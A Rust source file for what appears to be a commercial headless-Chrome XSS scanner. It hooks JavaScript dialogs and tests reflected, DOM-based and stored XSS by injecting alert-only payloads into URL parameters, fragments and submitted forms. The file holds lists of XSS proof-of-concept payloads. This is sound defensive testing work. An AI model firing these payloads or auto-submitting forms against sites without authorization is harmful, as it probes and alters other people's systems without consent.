// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

//! Chromium-based XSS Scanner with Real JavaScript Execution Detection
//!
//! This is the ONLY XSS scanner - uses real browser to detect XSS by:
//! 1. Intercepting JavaScript dialogs (alert, confirm, prompt)
//! 2. Submitting forms with XSS payloads and detecting stored XSS
//! 3. Testing DOM-based XSS with URL fragment/query payloads
//!
//! Uses a SINGLE shared browser instance for performance.

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, ScanMode, Severity, Vulnerability};
use anyhow::{Context, Result};
use headless_chrome::{Browser, LaunchOptions, Tab};
use std::collections::HashSet;
use std::sync::{Arc, Mutex, RwLock};
use std::time::Duration;
use tracing::{debug, info, warn};

/// JavaScript code to intercept alert/confirm/prompt
const XSS_INTERCEPTOR: &str = r#"
(function() {
    window.__xssMarker = null;
    window.__xssTriggered = false;
    window.__xssTriggerType = 'none';
    window.__xssMessage = '';

    window.__originalAlert = window.alert;
    window.__originalConfirm = window.confirm;
    window.__originalPrompt = window.prompt;

    window.alert = function(msg) {
        window.__xssMessage = String(msg);
        if (window.__xssMarker && String(msg).includes(window.__xssMarker)) {
            window.__xssTriggered = true;
            window.__xssTriggerType = 'alert';
        }
        console.log('[XSS-DETECTED] alert:', msg);
    };

    window.confirm = function(msg) {
        window.__xssMessage = String(msg);
        if (window.__xssMarker && String(msg).includes(window.__xssMarker)) {
            window.__xssTriggered = true;
            window.__xssTriggerType = 'confirm';
        }
        return true;
    };

    window.prompt = function(msg, def) {
        window.__xssMessage = String(msg);
        if (window.__xssMarker && String(msg).includes(window.__xssMarker)) {
            window.__xssTriggered = true;
            window.__xssTriggerType = 'prompt';
        }
        return def || '';
    };

    console.log('[XSS-SCANNER] Interceptor installed');
})();
"#;

/// Shared browser instance for all XSS tests
/// Uses Arc internally so it can be cloned and shared across threads
pub struct SharedBrowser {
    browser: Arc<RwLock<Browser>>,
}

impl Clone for SharedBrowser {
    fn clone(&self) -> Self {
        Self {
            browser: Arc::clone(&self.browser),
        }
    }
}

impl SharedBrowser {
    /// Create a new shared browser instance
    pub fn new() -> Result<Self> {
        info!("[SharedBrowser] Launching headless Chrome...");

        let options = LaunchOptions::default_builder()
            .headless(true)
            .idle_browser_timeout(Duration::from_secs(300)) // 5 min timeout
            .build()
            .map_err(|e| anyhow::anyhow!("Failed to build browser options: {}", e))?;

        let browser = Browser::new(options)
            .context("Failed to launch headless Chrome")?;

        info!("[SharedBrowser] Chrome launched successfully");
        Ok(Self {
            browser: Arc::new(RwLock::new(browser)),
        })
    }

    /// Create a new tab with XSS interceptor pre-installed
    pub fn new_tab_with_interceptor(&self, marker: &str) -> Result<Arc<Tab>> {
        let browser = self.browser.read()
            .map_err(|e| anyhow::anyhow!("Failed to lock browser: {}", e))?;
        let tab = browser.new_tab()?;

        // Set the marker and install interceptor
        let setup_js = format!(
            "{}\nwindow.__xssMarker = '{}';",
            XSS_INTERCEPTOR,
            marker
        );

        // Navigate to about:blank first and inject interceptor
        tab.navigate_to("about:blank")?;
        std::thread::sleep(Duration::from_millis(100));
        tab.evaluate(&setup_js, false)?;

        Ok(tab)
    }

    /// Check if browser is still alive
    pub fn is_alive(&self) -> bool {
        // Try to create a tab to check if browser is responsive
        if let Ok(browser) = self.browser.read() {
            browser.new_tab().is_ok()
        } else {
            false
        }
    }
}

/// XSS Detection result from Chromium
#[derive(Debug, Clone)]
pub struct XssDetectionResult {
    pub xss_triggered: bool,
    pub trigger_type: XssTriggerType,
    pub payload: String,
    pub dialog_message: Option<String>,
    pub url: String,
}

/// How the XSS was triggered
#[derive(Debug, Clone, PartialEq)]
pub enum XssTriggerType {
    AlertDialog,
    ConfirmDialog,
    PromptDialog,
    DomExecution,
    None,
}

/// Chromium-based XSS Scanner - the ONLY XSS scanner
pub struct ChromiumXssScanner {
    http_client: Arc<HttpClient>,
    confirmed_vulns: Arc<Mutex<HashSet<String>>>,
}

impl ChromiumXssScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self {
            http_client,
            confirmed_vulns: Arc::new(Mutex::new(HashSet::new())),
        }
    }

    /// Main scan entry point - uses shared browser
    pub async fn scan(
        &self,
        url: &str,
        config: &ScanConfig,
        shared_browser: Option<&SharedBrowser>,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // Mandatory authorization check
        if !crate::license::verify_scan_authorized() {
            return Ok((Vec::new(), 0));
        }
        if !crate::signing::is_scan_authorized() {
            warn!("[Chromium-XSS] Scan blocked: No valid scan authorization");
            return Ok((Vec::new(), 0));
        }

        info!("[Chromium-XSS] Starting real browser XSS scan for: {}", url);

        // Clone shared browser or create temporary one
        let browser: SharedBrowser = match shared_browser {
            Some(b) => b.clone(),
            None => {
                warn!("[Chromium-XSS] No shared browser, creating temporary instance");
                SharedBrowser::new()?
            }
        };

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Run all XSS tests in blocking context (headless_chrome is sync)
        let url_owned = url.to_string();
        let mode = config.scan_mode.clone();

        let results = tokio::task::spawn_blocking(move || {
            Self::run_all_xss_tests_sync(&url_owned, &mode, &browser)
        })
        .await
        .context("XSS test task panicked")??;

        for result in results {
            if result.xss_triggered {
                let vuln = self.create_vulnerability(&result)?;

                // Dedup
                let vuln_key = format!("{}:{:?}", result.url, result.trigger_type);
                let mut confirmed = self.confirmed_vulns.lock().unwrap();
                if !confirmed.contains(&vuln_key) {
                    confirmed.insert(vuln_key);
                    vulnerabilities.push(vuln);
                }
            }
            tests_run += 1;
        }

        info!(
            "[Chromium-XSS] Scan complete: {} confirmed XSS, {} tests",
            vulnerabilities.len(),
            tests_run
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Run all XSS tests synchronously (for headless_chrome)
    fn run_all_xss_tests_sync(
        url: &str,
        mode: &ScanMode,
        browser: &SharedBrowser,
    ) -> Result<Vec<XssDetectionResult>> {
        let mut results = Vec::new();

        // Phase 1: Reflected XSS via URL parameters
        info!("[Chromium-XSS] Phase 1: Testing reflected XSS");
        let reflected = Self::test_reflected_xss(url, mode, browser)?;
        results.extend(reflected);

        // Phase 2: DOM XSS via URL hash
        info!("[Chromium-XSS] Phase 2: Testing DOM XSS");
        let dom = Self::test_dom_xss(url, browser)?;
        results.extend(dom);

        // Phase 3: Stored XSS via forms
        info!("[Chromium-XSS] Phase 3: Testing stored XSS");
        let stored = Self::test_stored_xss(url, browser)?;
        results.extend(stored);

        Ok(results)
    }

    /// Test reflected XSS by injecting payloads into URL parameters
    fn test_reflected_xss(
        url: &str,
        mode: &ScanMode,
        browser: &SharedBrowser,
    ) -> Result<Vec<XssDetectionResult>> {
        let mut results = Vec::new();
        let payloads = Self::get_xss_payloads(mode);

        for payload_template in payloads.iter().take(10) { // Limit for speed
            let marker = format!("XSS{}", uuid::Uuid::new_v4().to_string()[..8].to_uppercase());
            let payload = payload_template.replace("MARKER", &marker);

            // Build test URL
            let test_url = if url.contains('?') {
                format!("{}&xss={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?xss={}", url, urlencoding::encode(&payload))
            };

            match Self::test_single_url(browser, &test_url, &marker) {
                Ok(result) => {
                    if result.xss_triggered {
                        info!("[Chromium-XSS] CONFIRMED reflected XSS!");
                        results.push(result);
                        break; // One confirmed is enough
                    }
                }
                Err(e) => debug!("[Chromium-XSS] Reflected test error: {}", e),
            }
        }

        Ok(results)
    }

    /// Test DOM XSS via URL hash/fragment
    fn test_dom_xss(url: &str, browser: &SharedBrowser) -> Result<Vec<XssDetectionResult>> {
        let mut results = Vec::new();

        let dom_payloads = vec![
            "#<img src=x onerror=alert('MARKER')>",
            "#<svg onload=alert('MARKER')>",
            "#\"><script>alert('MARKER')</script>",
        ];

        for payload_template in &dom_payloads {
            let marker = format!("DOM{}", uuid::Uuid::new_v4().to_string()[..8].to_uppercase());
            let payload = payload_template.replace("MARKER", &marker);
            let test_url = format!("{}{}", url.trim_end_matches('#'), payload);

            match Self::test_single_url(browser, &test_url, &marker) {
                Ok(result) => {
                    if result.xss_triggered {
                        info!("[Chromium-XSS] CONFIRMED DOM XSS!");
                        results.push(result);
                        break;
                    }
                }
                Err(e) => debug!("[Chromium-XSS] DOM test error: {}", e),
            }
        }

        Ok(results)
    }

    /// Test stored XSS by submitting forms and checking execution
    fn test_stored_xss(url: &str, browser: &SharedBrowser) -> Result<Vec<XssDetectionResult>> {
        let mut results = Vec::new();
        let marker = format!("STORED{}", uuid::Uuid::new_v4().to_string()[..8].to_uppercase());

        // Navigate to page and find forms
        let tab = browser.new_tab_with_interceptor(&marker)?;
        tab.set_default_timeout(Duration::from_secs(10));
        tab.navigate_to(url)?;

        // Wait for page load (reduced from 2s)
        std::thread::sleep(Duration::from_millis(1500));

        // Find forms and their inputs
        let forms_js = r#"
            (function() {
                const forms = [];
                document.querySelectorAll('form').forEach((form, idx) => {
                    const inputs = [];
                    form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"]), textarea').forEach(el => {
                        if (el.type !== 'checkbox' && el.type !== 'radio' && el.type !== 'file') {
                            inputs.push({
                                name: el.name || el.id || '',
                                selector: el.name ? `[name="${el.name}"]` : (el.id ? `#${el.id}` : null)
                            });
                        }
                    });
                    if (inputs.length > 0) {
                        forms.push({ index: idx, inputs: inputs });
                    }
                });
                return JSON.stringify(forms);
            })()
        "#;

        let forms_result = tab.evaluate(forms_js, false)?;
        let forms: Vec<serde_json::Value> = if let Some(value) = forms_result.value {
            if let Some(json_str) = value.as_str() {
                serde_json::from_str(json_str).unwrap_or_default()
            } else {
                Vec::new()
            }
        } else {
            Vec::new()
        };

        info!("[Chromium-XSS] Found {} forms to test", forms.len());

        // XSS payloads for stored testing
        let stored_payloads = vec![
            format!("<script>alert('{}')</script>", marker),
            format!("<img src=x onerror=alert('{}')>", marker),
            format!("<svg onload=alert('{}')>", marker),
        ];

        for form in forms.iter().take(3) { // Limit forms tested
            let inputs = form.get("inputs").and_then(|v| v.as_array()).cloned().unwrap_or_default();
            let form_idx = form.get("index").and_then(|v| v.as_i64()).unwrap_or(0);

            for payload in &stored_payloads {
                // Reset XSS detection state
                let _ = tab.evaluate(&format!(
                    "window.__xssMarker = '{}'; window.__xssTriggered = false; window.__xssTriggerType = 'none'; window.__xssMessage = '';",
                    marker
                ), false);

                // Fill all text inputs with payload
                for input in &inputs {
                    if let Some(selector) = input.get("selector").and_then(|v| v.as_str()) {
                        if !selector.is_empty() {
                            let fill_js = format!(
                                r#"(function() {{
                                    const el = document.querySelector('{}');
                                    if (el) {{ el.value = '{}'; }}
                                }})()"#,
                                selector.replace("'", "\\'"),
                                payload.replace("'", "\\'").replace("\\", "\\\\")
                            );
                            let _ = tab.evaluate(&fill_js, false);
                        }
                    }
                }

                // Submit form
                let submit_js = format!(
                    r#"(function() {{
                        const form = document.querySelectorAll('form')[{}];
                        if (form) {{
                            const btn = form.querySelector('[type="submit"], button:not([type="button"])');
                            if (btn) btn.click(); else form.submit();
                        }}
                    }})()"#,
                    form_idx
                );
                let _ = tab.evaluate(&submit_js, false);

                // Wait for submission and potential redirect (reduced from 3s)
                std::thread::sleep(Duration::from_millis(2000));

                // Check if XSS triggered
                if let Some(result) = Self::check_xss_triggered(&tab, url, payload)? {
                    if result.xss_triggered {
                        info!("[Chromium-XSS] CONFIRMED stored XSS via form!");
                        results.push(result);
                        return Ok(results); // One stored XSS is enough
                    }
                }

                // Navigate back to test next payload
                let _ = tab.navigate_to(url);
                std::thread::sleep(Duration::from_millis(800));
            }
        }

        Ok(results)
    }

    /// Test a single URL and check for XSS execution
    fn test_single_url(
        browser: &SharedBrowser,
        url: &str,
        marker: &str,
    ) -> Result<XssDetectionResult> {
        let tab = browser.new_tab_with_interceptor(marker)?;

        // Set navigation timeout - shorter to avoid blocking
        tab.set_default_timeout(Duration::from_secs(8));

        // Navigate to test URL with timeout handling
        // Use navigate_to which returns immediately, then wait for network idle
        if let Err(e) = tab.navigate_to(url) {
            debug!("[Chromium-XSS] Navigation failed for {}: {}", url, e);
            return Ok(XssDetectionResult {
                xss_triggered: false,
                trigger_type: XssTriggerType::None,
                payload: url.to_string(),
                dialog_message: None,
                url: url.to_string(),
            });
        }

        // Wait for page load - use wait_until_navigated with timeout
        // If this fails, we still check XSS since interceptor might have caught it
        let _ = tab.wait_until_navigated();

        // Brief pause for JS execution
        std::thread::sleep(Duration::from_millis(500));

        // Check if XSS was triggered
        Self::check_xss_triggered(&tab, url, url)?
            .ok_or_else(|| anyhow::anyhow!("Failed to check XSS result"))
    }

    /// Check if XSS was triggered in the current tab
    fn check_xss_triggered(
        tab: &Tab,
        url: &str,
        payload: &str,
    ) -> Result<Option<XssDetectionResult>> {
        let check_js = r#"
            JSON.stringify({
                triggered: window.__xssTriggered || false,
                type: window.__xssTriggerType || 'none',
                message: window.__xssMessage || ''
            })
        "#;

        let result = tab.evaluate(check_js, false)?;

        if let Some(value) = result.value {
            if let Some(json_str) = value.as_str() {
                if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(json_str) {
                    let triggered = parsed.get("triggered").and_then(|v| v.as_bool()).unwrap_or(false);
                    let trigger_str = parsed.get("type").and_then(|v| v.as_str()).unwrap_or("none");
                    let message = parsed.get("message").and_then(|v| v.as_str()).map(|s| s.to_string());

                    let trigger_type = match trigger_str {
                        "alert" => XssTriggerType::AlertDialog,
                        "confirm" => XssTriggerType::ConfirmDialog,
                        "prompt" => XssTriggerType::PromptDialog,
                        _ => XssTriggerType::None,
                    };

                    return Ok(Some(XssDetectionResult {
                        xss_triggered: triggered,
                        trigger_type,
                        payload: payload.to_string(),
                        dialog_message: message,
                        url: url.to_string(),
                    }));
                }
            }
        }

        Ok(None)
    }

    /// Create vulnerability from detection result
    fn create_vulnerability(&self, result: &XssDetectionResult) -> Result<Vulnerability> {
        let trigger_desc = match result.trigger_type {
            XssTriggerType::AlertDialog => "JavaScript alert() executed",
            XssTriggerType::ConfirmDialog => "JavaScript confirm() executed",
            XssTriggerType::PromptDialog => "JavaScript prompt() executed",
            XssTriggerType::DomExecution => "DOM script execution detected",
            XssTriggerType::None => "Unknown trigger",
        };

        let xss_type = if result.payload.contains("STORED") {
            "Stored XSS"
        } else if result.payload.contains("DOM") || result.payload.starts_with('#') {
            "DOM-based XSS"
        } else {
            "Reflected XSS"
        };

        Ok(Vulnerability {
            id: format!("xss_{}", uuid::Uuid::new_v4()),
            vuln_type: format!("{} (CONFIRMED)", xss_type),
            severity: Severity::High,
            confidence: Confidence::High,
            category: "Injection".to_string(),
            url: result.url.clone(),
            parameter: None,
            payload: result.payload.clone(),
            description: format!(
                "CONFIRMED {} vulnerability. {}. Payload executed in real browser context.",
                xss_type, trigger_desc
            ),
            evidence: Some(format!(
                "Trigger: {}\nPayload: {}\nMessage: {}",
                trigger_desc,
                result.payload,
                result.dialog_message.as_deref().unwrap_or("N/A")
            )),
            cwe: "CWE-79".to_string(),
            cvss: 7.5,
            verified: true,
            false_positive: false,
            remediation: "1. Encode all user input before rendering\n\
                         2. Use Content Security Policy (CSP)\n\
                         3. Use HTTP-only cookies\n\
                         4. Sanitize HTML with DOMPurify".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
            ml_data: None,
        })
    }

    /// Get XSS payloads based on scan mode
    fn get_xss_payloads(mode: &ScanMode) -> Vec<String> {
        let base = vec![
            "<script>alert('MARKER')</script>".to_string(),
            "<img src=x onerror=alert('MARKER')>".to_string(),
            "<svg onload=alert('MARKER')>".to_string(),
            "'\"><script>alert('MARKER')</script>".to_string(),
            "<body onload=alert('MARKER')>".to_string(),
        ];

        let advanced = vec![
            "<details open ontoggle=alert('MARKER')>".to_string(),
            "<input onfocus=alert('MARKER') autofocus>".to_string(),
            "<marquee onstart=alert('MARKER')>".to_string(),
            "<script>alert`MARKER`</script>".to_string(),
        ];

        match mode {
            ScanMode::Fast => base[..3].to_vec(),
            ScanMode::Normal => base,
            _ => {
                let mut all = base;
                all.extend(advanced);
                all
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xss_payloads() {
        let payloads = ChromiumXssScanner::get_xss_payloads(&ScanMode::Normal);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.contains("MARKER")));
    }

    #[test]
    fn test_trigger_types() {
        assert_eq!(XssTriggerType::AlertDialog, XssTriggerType::AlertDialog);
        assert_ne!(XssTriggerType::AlertDialog, XssTriggerType::ConfirmDialog);
    }
}
